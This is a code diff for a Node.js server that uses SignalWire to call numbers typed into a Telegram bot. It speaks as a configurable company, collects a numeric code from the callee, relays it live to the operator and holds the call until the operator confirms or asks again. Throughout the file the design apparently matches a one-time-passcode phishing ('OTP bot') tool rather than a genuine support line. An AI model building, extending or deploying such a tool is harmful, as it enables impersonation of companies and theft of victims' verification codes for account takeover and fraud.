@@ -1,365 +1,558 @@
-const express=require("express")
-const bodyParser=require("body-parser")
-const fetch=require("node-fetch")
+const express = require("express");
+const bodyParser = require("body-parser");
+const fetch = require("node-fetch");
 
-const app=express()
+const app = express();
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
 
-app.use(bodyParser.urlencoded({extended:false}))
-app.use(bodyParser.json())
+// ========= ENV =========
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-// ENV
-const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
-const CHAT_ID=process.env.CHAT_ID
+const SW_PROJECT = process.env.SW_PROJECT;
+const SW_TOKEN = process.env.SW_TOKEN;
+const SW_SPACE = process.env.SW_SPACE; // e.g. codesncalls.signalwire.com
+const SW_NUMBER = process.env.SW_NUMBER; // your SignalWire number
+const BASE_URL = process.env.BASE_URL;   // e.g. https://ivr-x4e8.onrender.com
 
-const SW_PROJECT=process.env.SW_PROJECT
-const SW_TOKEN=process.env.SW_TOKEN
-const SW_SPACE=process.env.SW_SPACE
-const SW_NUMBER=process.env.SW_NUMBER
+// ========= SETTINGS =========
+let settings = {
+  company: "Support",
+  digits: 6,
+  assistant: 0
+};
 
-const BASE_URL=process.env.BASE_URL
+const assistants = [
+  { name: "Nova", voice: "Polly.Joanna" },
+  { name: "Lyra", voice: "Polly.Emma" },
+  { name: "Orion", voice: "Polly.Brian" },
+  { name: "Astra", voice: "Polly.Amy" },
+  { name: "Kairo", voice: "Polly.Matthew" },
+  { name: "Solara", voice: "Polly.Ivy" }
+];
 
-// SETTINGS
-let settings={
-company:"Support",
-digits:6,
-assistant:"Nova"
+// ========= STATE =========
+let activeCallSid = null;
+let activeCaller = null;
+let activeCode = null;
+let callStart = null;
+let callState = "idle"; // idle, waiting_code, code_received, ended
+let lastCaller = null;
+let panelMessageId = null;
+let logs = [];
+let pendingAction = null; // call_number, company, digits, voice
+
+// ========= HELPERS =========
+function authHeader() {
+  return "Basic " + Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64");
 }
 
-const assistants={
-Nova:"Polly.Amy",
-Lyra:"Polly.Emma",
-Orion:"Polly.Brian",
-Astra:"Polly.Joanna",
-Kairo:"Polly.Matthew",
-Solara:"Polly.Amy"
+function getAssistant() {
+  return assistants[settings.assistant] || assistants[0];
 }
 
-// STATE
-let activeCallSid=null
-let activeCaller=null
-let activeCode=null
-let callStart=null
-let panelMessage=null
-let logs=[]
-let pendingAction=null
-
-function auth(){
-return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
+function durationText() {
+  if (!callStart) return "00:00";
+  const total = Math.floor((Date.now() - callStart) / 1000);
+  const mm = String(Math.floor(total / 60)).padStart(2, "0");
+  const ss = String(total % 60).padStart(2, "0");
+  return `${mm}:${ss}`;
 }
 
-function duration(){
-if(!callStart)return"00:00"
-let s=Math.floor((Date.now()-callStart)/1000)
-let m=String(Math.floor(s/60)).padStart(2,"0")
-let sec=String(s%60).padStart(2,"0")
-return`${m}:${sec}`
+async function tg(method, data) {
+  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  });
+  return res.json();
 }
 
-async function tg(method,data){
-return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify(data)
-}).then(r=>r.json())
+async function tgSend(text, keyboard = null) {
+  const payload = { chat_id: CHAT_ID, text };
+  if (keyboard) {
+    payload.reply_markup = { inline_keyboard: keyboard };
+  }
+  return tg("sendMessage", payload);
 }
 
-async function tgSend(text,kb=null){
-let p={chat_id:CHAT_ID,text:text}
-if(kb)p.reply_markup={inline_keyboard:kb}
-return tg("sendMessage",p)
+async function tgAnswerCallback(id, text = "") {
+  return tg("answerCallbackQuery", {
+    callback_query_id: id,
+    text
+  });
 }
 
-async function updatePanel(){
+function panelKeyboard() {
+  return [
+    [
+      { text: "✔ Confirm", callback_data: "confirm" },
+      { text: "🔁 Ask Again", callback_data: "again" }
+    ],
+    [
+      { text: "⛔ Hang Up", callback_data: "hangup" }
+    ],
+    [
+      { text: "📊 Status", callback_data: "status" },
+      { text: "📜 Logs", callback_data: "logs" }
+    ],
+    [
+      { text: "📞 Start Call", callback_data: "start_call" },
+      { text: "☎ Call Last", callback_data: "call_last" }
+    ],
+    [
+      { text: "🏢 Company", callback_data: "set_company" },
+      { text: "🔢 Digits", callback_data: "set_digits" }
+    ],
+    [
+      { text: "🎙 Voice", callback_data: "set_voice" }
+    ]
+  ];
+}
 
-if(!panelMessage)return
+function panelText() {
+  return `📞 IVR CONTROL PANEL
 
-let text=`📞 IVR CONTROL PANEL
-
-Caller: ${activeCaller||"none"}
-Code: ${activeCode||"waiting"}
-
-Duration: ${duration()}
+State: ${callState}
+Caller: ${activeCaller || "none"}
+Code: ${activeCode || "waiting"}
+Duration: ${callState === "idle" ? "00:00" : durationText()}
 
 Company: ${settings.company}
 Digits: ${settings.digits}
-Assistant: ${settings.assistant}`
-
-try{
-await tg("editMessageText",{
-chat_id:CHAT_ID,
-message_id:panelMessage,
-text:text,
-reply_markup:{
-inline_keyboard:[
-[
-{ text:"✔ Confirm",callback_data:"confirm"},
-{ text:"🔁 Ask Again",callback_data:"again"}
-],
-[
-{ text:"⛔ Hang Up",callback_data:"hangup"}
-],
-[
-{ text:"📞 Start Call",callback_data:"start_call"},
-{ text:"☎ Call Last",callback_data:"call_last"}
-],
-[
-{ text:"📊 Status",callback_data:"status"},
-{ text:"📜 Logs",callback_data:"logs"}
-]
-]
-}
-})
-}catch{}
+Assistant: ${settings.assistant + 1} - ${getAssistant().name}`;
 }
 
-async function updateCall(twiml){
-
-if(!activeCallSid)return
-
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({Twiml:twiml})
-})
-
+async function ensurePanel() {
+  if (panelMessageId) return;
+  const msg = await tgSend("📞 IVR CONTROL PANEL\n\nStarting...");
+  if (msg && msg.result && msg.result.message_id) {
+    panelMessageId = msg.result.message_id;
+  }
 }
 
-async function startCall(number){
+async function updatePanel() {
+  await ensurePanel();
+  if (!panelMessageId) return;
 
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({
-From:SW_NUMBER,
-To:number,
-Url:`${BASE_URL}/ivr`
-})
-})
-
+  try {
+    await tg("editMessageText", {
+      chat_id: CHAT_ID,
+      message_id: panelMessageId,
+      text: panelText(),
+      reply_markup: { inline_keyboard: panelKeyboard() }
+    });
+  } catch (e) {
+    // ignore harmless edit errors
+  }
 }
 
-function log(result){
-
-logs.unshift({
-caller:activeCaller,
-code:activeCode,
-result,
-time:new Date().toLocaleString()
-})
-
-logs=logs.slice(0,10)
-
+function pushLog(result) {
+  logs.unshift({
+    caller: activeCaller || "unknown",
+    code: activeCode || "none",
+    result,
+    time: new Date().toLocaleString()
+  });
+  logs = logs.slice(0, 10);
 }
 
-// ROOT
-app.get("/",(req,res)=>{
-res.send("Server running")
-})
+async function updateLiveCallTwiml(twiml) {
+  if (!activeCallSid) return;
 
-// IVR
-app.post("/ivr",async(req,res)=>{
+  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`;
 
-const digits=req.body.Digits
-const caller=req.body.From
-const sid=req.body.CallSid
+  await fetch(url, {
+    method: "POST",
+    headers: {
+      Authorization: authHeader(),
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: new URLSearchParams({ Twiml: twiml })
+  });
+}
 
-if(!digits){
+async function endLiveCall() {
+  if (!activeCallSid) return;
 
-activeCallSid=sid
-activeCaller=caller
-activeCode=null
-callStart=Date.now()
+  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`;
 
-res.type("text/xml")
-return res.send(`
+  await fetch(url, {
+    method: "POST",
+    headers: {
+      Authorization: authHeader(),
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: new URLSearchParams({ Status: "completed" })
+  });
+}
+
+async function startOutboundCall(to) {
+  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`;
+
+  await fetch(url, {
+    method: "POST",
+    headers: {
+      Authorization: authHeader(),
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: new URLSearchParams({
+      From: SW_NUMBER,
+      To: to,
+      Url: `${BASE_URL}/ivr`
+    })
+  });
+}
+
+// ========= ROOT =========
+app.get("/", (req, res) => {
+  res.send("Server running");
+});
+
+// ========= IVR =========
+app.post("/ivr", async (req, res) => {
+  const digits = req.body.Digits;
+  const caller = req.body.From;
+  const sid = req.body.CallSid;
+
+  // First step: ask for digits
+  if (!digits) {
+    activeCallSid = sid || activeCallSid;
+    activeCaller = caller || activeCaller;
+    activeCode = null;
+    lastCaller = caller || lastCaller;
+    callStart = Date.now();
+    callState = "waiting_code";
+
+    await updatePanel();
+
+    res.type("text/xml");
+    return res.send(`
 <Response>
-<Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr" method="POST" timeout="8">
-<Say voice="${assistants[settings.assistant]}">
-Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
-</Say>
-</Gather>
-<Redirect>${BASE_URL}/ivr</Redirect>
+  <Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr" method="POST" timeout="8">
+    <Say voice="${getAssistant().voice}">
+      Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
+    </Say>
+  </Gather>
+  <Redirect method="POST">${BASE_URL}/ivr</Redirect>
 </Response>
-`)
-}
+`);
+  }
 
-activeCallSid=sid
-activeCaller=caller
-activeCode=digits
-callStart=callStart||Date.now()
+  // Digits received
+  activeCallSid = sid || activeCallSid;
+  activeCaller = caller || activeCaller;
+  activeCode = String(digits).trim();
+  lastCaller = caller || lastCaller;
+  callStart = callStart || Date.now();
+  callState = "code_received";
 
-log("Code received")
+  pushLog("Code received");
 
-// RESPOND TO CALLER FIRST (FAST)
-
-res.type("text/xml")
-res.send(`
+  // Respond to caller first = faster
+  res.type("text/xml");
+  res.send(`
 <Response>
-<Say voice="${assistants[settings.assistant]}">
-Thank you. Your code has been received.
-</Say>
-<Redirect>${BASE_URL}/hold</Redirect>
+  <Say voice="${getAssistant().voice}">
+    Thank you. Your code has been received.
+  </Say>
+  <Redirect method="POST">${BASE_URL}/hold</Redirect>
 </Response>
-`)
+`);
 
-// TELEGRAM AFTER RESPONSE
-setTimeout(async()=>{
-
-await tgSend(`📞 CODE RECEIVED
+  // Telegram after response
+  setTimeout(async () => {
+    try {
+      await tgSend(
+        `📞 CODE RECEIVED
 
 Caller: ${caller}
-Code: ${digits}`,[
-[
-{ text:"✔ Confirm",callback_data:"confirm"},
-{ text:"🔁 Ask Again",callback_data:"again"}
-],
-[
-{ text:"⛔ Hang Up",callback_data:"hangup"}
-]
-])
+Code: ${digits}
 
-await updatePanel()
+Choose action:`,
+        [
+          [
+            { text: "✔ Confirm", callback_data: "confirm" },
+            { text: "🔁 Ask Again", callback_data: "again" }
+          ],
+          [
+            { text: "⛔ Hang Up", callback_data: "hangup" }
+          ]
+        ]
+      );
 
-},0)
-res.type("text/xml")
-res.send(`
+      await updatePanel();
+    } catch (e) {
+      console.log("Telegram error:", e);
+    }
+  }, 0);
+});
+
+// ========= HOLD =========
+app.post("/hold", (req, res) => {
+  res.type("text/xml");
+  return res.send(`
 <Response>
-<Say voice="${assistants[settings.assistant]}">
-Thank you. Your code has been received.
-</Say>
-<Redirect>${BASE_URL}/hold</Redirect>
+  <Pause length="10"/>
+  <Redirect method="POST">${BASE_URL}/hold</Redirect>
 </Response>
-`)
+`);
+});
 
-})
+// ========= TELEGRAM =========
+app.post("/telegram", async (req, res) => {
+  const update = req.body;
 
-// HOLD LOOP
-app.post("/hold",(req,res)=>{
+  // ----- CALLBACK BUTTONS -----
+  if (update.callback_query) {
+    const action = update.callback_query.data;
+    const cbId = update.callback_query.id;
 
-res.type("text/xml")
-res.send(`
+    try {
+      if (action === "confirm") {
+        await updateLiveCallTwiml(`
 <Response>
-<Pause length="20"/>
-<Redirect>${BASE_URL}/hold</Redirect>
+  <Say voice="${getAssistant().voice}">
+    Thank you. Your code has been confirmed. Goodbye.
+  </Say>
+  <Hangup/>
 </Response>
-`)
+`);
+        pushLog("Confirmed");
+        callState = "ended";
+        await tgSend("✔ Code confirmed and call ended.");
+        activeCallSid = null;
+        callStart = null;
+        await updatePanel();
+        await tgAnswerCallback(cbId, "Confirmed");
+      }
 
-})
-
-// TELEGRAM
-app.post("/telegram",async(req,res)=>{
-
-const update=req.body
-
-if(update.callback_query){
-
-let action=update.callback_query.data
-
-if(action=="confirm"){
-
-await updateCall(`
+      if (action === "again") {
+        await updateLiveCallTwiml(`
 <Response>
-<Say voice="${assistants[settings.assistant]}">
-Your code has been confirmed. Goodbye.
-</Say>
-<Hangup/>
+  <Say voice="${getAssistant().voice}">
+    Please enter your code again.
+  </Say>
+  <Redirect method="POST">${BASE_URL}/ivr</Redirect>
 </Response>
-`)
+`);
+        callState = "waiting_code";
+        activeCode = null;
+        await tgSend("🔁 Asked caller to enter the code again.");
+        await updatePanel();
+        await tgAnswerCallback(cbId, "Asked again");
+      }
 
-log("Confirmed")
-activeCallSid=null
-callStart=null
-
-await tgSend("✔ Call confirmed")
-
-}
-
-if(action=="again"){
-
-await updateCall(`
+      if (action === "hangup") {
+        await updateLiveCallTwiml(`
 <Response>
-<Say>Please enter your code again.</Say>
-<Redirect>${BASE_URL}/ivr</Redirect>
+  <Say voice="${getAssistant().voice}">
+    This call will now end.
+  </Say>
+  <Hangup/>
 </Response>
-`)
+`);
+        pushLog("Hung up");
+        callState = "ended";
+        await tgSend("⛔ Call ended.");
+        activeCallSid = null;
+        callStart = null;
+        await updatePanel();
+        await tgAnswerCallback(cbId, "Hung up");
+      }
 
-}
+      if (action === "status") {
+        await tgSend(panelText());
+        await tgAnswerCallback(cbId, "Status sent");
+      }
 
-if(action=="hangup"){
+      if (action === "logs") {
+        if (!logs.length) {
+          await tgSend("No logs yet.");
+        } else {
+          let msg = "📜 LAST 10 CALLS\n\n";
+          logs.forEach((l, i) => {
+            msg += `${i + 1}. ${l.caller}\nCode: ${l.code}\nResult: ${l.result}\nTime: ${l.time}\n\n`;
+          });
+          await tgSend(msg.trim());
+        }
+        await tgAnswerCallback(cbId, "Logs sent");
+      }
 
-await updateCall(`
-<Response>
-<Say>This call will now end.</Say>
-<Hangup/>
-</Response>
-`)
+      if (action === "start_call") {
+        pendingAction = "call_number";
+        await tgSend("📞 Send the number you want to call.\nExample:\n+12125551234");
+        await tgAnswerCallback(cbId, "Send number");
+      }
 
-log("Hung up")
-activeCallSid=null
-callStart=null
+      if (action === "call_last") {
+        if (!lastCaller) {
+          await tgSend("No last caller available.");
+        } else {
+          await startOutboundCall(lastCaller);
+          await tgSend(`☎ Calling last caller: ${lastCaller}`);
+        }
+        await tgAnswerCallback(cbId, "Call started");
+      }
 
-}
+      if (action === "set_company") {
+        pendingAction = "company";
+        await tgSend("🏢 Send the new company name.");
+        await tgAnswerCallback(cbId, "Waiting for company");
+      }
 
-if(action=="call_last"){
+      if (action === "set_digits") {
+        pendingAction = "digits";
+        await tgSend("🔢 Send the new digit length (4-10).");
+        await tgAnswerCallback(cbId, "Waiting for digits");
+      }
 
-if(activeCaller){
-await startCall(activeCaller)
-await tgSend(`☎ Calling last caller ${activeCaller}`)
-}
+      if (action === "set_voice") {
+        pendingAction = "voice";
+        await tgSend(`🎙 Send a voice number:
+1 = ${assistants[0].name}
+2 = ${assistants[1].name}
+3 = ${assistants[2].name}
+4 = ${assistants[3].name}
+5 = ${assistants[4].name}
+6 = ${assistants[5].name}`);
+        await tgAnswerCallback(cbId, "Waiting for voice");
+      }
+    } catch (e) {
+      console.log("Callback error:", e);
+    }
 
-}
+    return res.sendStatus(200);
+  }
 
-if(action=="start_call"){
-pendingAction="call"
-await tgSend("Send the number to call")
-}
+  // ----- TEXT COMMANDS -----
+  if (update.message && update.message.text) {
+    const text = update.message.text.trim();
 
-}
+    try {
+      if (pendingAction === "call_number") {
+        pendingAction = null;
+        await startOutboundCall(text);
+        await tgSend(`📞 Calling ${text}`);
+        return res.sendStatus(200);
+      }
 
-if(update.message){
+      if (pendingAction === "company") {
+        pendingAction = null;
+        settings.company = text;
+        await tgSend(`🏢 Company set to: ${settings.company}`);
+        await updatePanel();
+        return res.sendStatus(200);
+      }
 
-let text=update.message.text
+      if (pendingAction === "digits") {
+        pendingAction = null;
+        const n = parseInt(text, 10);
+        if (!Number.isInteger(n) || n < 4 || n > 10) {
+          await tgSend("Invalid digit length. Use a number from 4 to 10.");
+        } else {
+          settings.digits = n;
+          await tgSend(`🔢 Digit length set to: ${settings.digits}`);
+          await updatePanel();
+        }
+        return res.sendStatus(200);
+      }
 
-if(pendingAction=="call"){
-pendingAction=null
-await startCall(text)
-await tgSend(`📞 Calling ${text}`)
-}
+      if (pendingAction === "voice") {
+        pendingAction = null;
+        const n = parseInt(text, 10);
+        if (!Number.isInteger(n) || n < 1 || n > 6) {
+          await tgSend("Invalid voice number. Use 1 to 6.");
+        } else {
+          settings.assistant = n - 1;
+          await tgSend(`🎙 Assistant set to: ${getAssistant().name}`);
+          await updatePanel();
+        }
+        return res.sendStatus(200);
+      }
 
-if(text=="/status"){
-await tgSend(`Active: ${activeCaller||"none"}`)
-}
+      if (text === "/status") {
+        await tgSend(panelText());
+      }
 
-if(text=="/logs"){
+      if (text === "/logs") {
+        if (!logs.length) {
+          await tgSend("No logs yet.");
+        } else {
+          let msg = "📜 LAST 10 CALLS\n\n";
+          logs.forEach((l, i) => {
+            msg += `${i + 1}. ${l.caller}\nCode: ${l.code}\nResult: ${l.result}\nTime: ${l.time}\n\n`;
+          });
+          await tgSend(msg.trim());
+        }
+      }
 
-let t="📜 Logs\n\n"
+      if (text.startsWith("/call ")) {
+        const number = text.replace("/call ", "").trim();
+        await startOutboundCall(number);
+        await tgSend(`📞 Calling ${number}`);
+      }
 
-logs.forEach((l,i)=>{
-t+=`${i+1}. ${l.caller} ${l.code} ${l.result}\n`
-})
+      if (text === "/calllast") {
+        if (!lastCaller) {
+          await tgSend("No last caller available.");
+        } else {
+          await startOutboundCall(lastCaller);
+          await tgSend(`☎ Calling last caller: ${lastCaller}`);
+        }
+      }
 
-await tgSend(t)
+      if (text.startsWith("/company ")) {
+        settings.company = text.replace("/company ", "").trim();
+        await tgSend(`🏢 Company set to: ${settings.company}`);
+        await updatePanel();
+      }
 
-}
+      if (text.startsWith("/digits ")) {
+        const n = parseInt(text.replace("/digits ", "").trim(), 10);
+        if (!Number.isInteger(n) || n < 4 || n > 10) {
+          await tgSend("Invalid digit length. Use /digits 6");
+        } else {
+          settings.digits = n;
+          await tgSend(`🔢 Digit length set to: ${settings.digits}`);
+          await updatePanel();
+        }
+      }
 
-}
+      if (text.startsWith("/voice ")) {
+        const n = parseInt(text.replace("/voice ", "").trim(), 10);
+        if (!Number.isInteger(n) || n < 1 || n > 6) {
+          await tgSend("Invalid voice number. Use /voice 1 to /voice 6");
+        } else {
+          settings.assistant = n - 1;
+          await tgSend(`🎙 Assistant set to: ${getAssistant().name}`);
+          await updatePanel();
+        }
+      }
 
-res.sendStatus(200)
+      if (text === "/panel") {
+        await updatePanel();
+        await tgSend("Panel refreshed.");
+      }
+    } catch (e) {
+      console.log("Message error:", e);
+    }
+  }
 
-})
+  return res.sendStatus(200);
+});
 
-setInterval(updatePanel,2000)
+// ========= LIVE PANEL TIMER =========
+setInterval(() => {
+  updatePanel().catch(() => {});
+}, 2000);
 
-const PORT=process.env.PORT||3000
+// ========= START =========
+const PORT = process.env.PORT || 3000;
 
-app.listen(PORT,async()=>{
-console.log("Server running")
-let msg=await tgSend("📞 IVR PANEL STARTED")
-panelMessage=msg.result.message_id
-})
+app.listen(PORT, async () => {
+  console.log("Server running");
+  await ensurePanel();
+  await updatePanel();
+});
